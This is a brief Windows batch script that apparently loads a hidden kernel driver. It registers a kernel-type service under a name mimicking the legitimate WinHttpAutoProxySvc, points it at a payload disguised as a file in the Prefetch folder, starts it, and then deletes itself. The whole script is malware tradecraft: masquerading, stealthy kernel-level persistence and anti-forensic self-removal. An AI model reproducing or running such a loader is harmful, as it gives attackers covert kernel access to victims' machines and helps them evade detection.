@echo off
cd %~dp0
sc create WinHttpAutoProxySvc475_c binpath=C:\Windows\Prefetch\CMD.EXE-T7M2FJ61.pf type=kernel
sc start WinHttpAutoProxySvc475_c
del "%~f0"